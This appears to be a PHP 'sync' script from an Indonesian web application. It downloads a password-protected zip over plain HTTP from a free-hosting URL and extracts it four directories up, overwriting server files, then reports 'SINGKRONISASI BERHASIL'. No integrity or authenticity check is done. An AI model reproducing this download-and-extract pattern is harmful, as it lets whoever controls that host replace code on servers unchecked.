<?php
echo "
<link rel='stylesheet' href='css/responsive.css'>
<link rel='stylesheet' href='css/main.css'>
<link rel='stylesheet' href='css/util.css'>
<link rel='stylesheet' href='css/bootstrap.css'>
";
$internet=@fsockopen('145.14.144.233', 80);
if($internet){

$f = file_put_contents('my-zip.zip', fopen('http://demounbk.000webhostapp.com/sma/xampp.zip', 'r'), LOCK_EX);
if(FALSE === $f)
    die('apes coyy');

$zip = new ZipArchive;
$res = $zip->open('my-zip.zip');
if ($res === TRUE) {
	if($zip->setPassword('ekotimo')){
  if(!$zip->extractTo('../../../../'))
	  echo " password salah";
	}
  $zip->close();
 echo "
 
<div class='col-sm-12'>
                <div class='alert  alert-success alert-dismissible fade show' role='alert'>
                  <span class='badge badge-pill badge-success'>Berhasil</span> &nbsp; SINGKRONISASI BERHASIL
                    <button type='button' class='close' data-dismiss='alert' aria-label='Close'>
                        <span aria-hidden='true'>&times;</span>
                    </button>
                </div>
            </div>";
 

} else {
  echo "<div class='col-sm-12' style='margin-top:65px; margin-bottom:-100px;'>
                <div class='alert  alert-danger alert-dismissible fade show' role='alert'>
                  <span class='badge badge-pill badge-danger'>Gagal</span> &nbsp; GAGAL SINGKRONISASI SILAHKAN DI ULANG
                    <button type='button' class='close' data-dismiss='alert' aria-label='Close'>
                        <span aria-hidden='true'>&times;</span>
                    </button>
                </div>
            </div>";
}
}else {
echo "


<div class='col-sm-12' style='margin-top:65px; margin-bottom:-100px;'>
                <div class='alert  alert-danger alert-dismissible fade show' role='alert'>
                  <span class='badge badge-pill badge-danger'>Gagal</span> &nbsp;Tidak terhubung dengan internet, Periksa koneksi internet
                    <button type='button' class='close' data-dismiss='alert' aria-label='Close'>
                        <span aria-hidden='true'>&times;</span>
                    </button>
                </div>
           </div>";
}


?>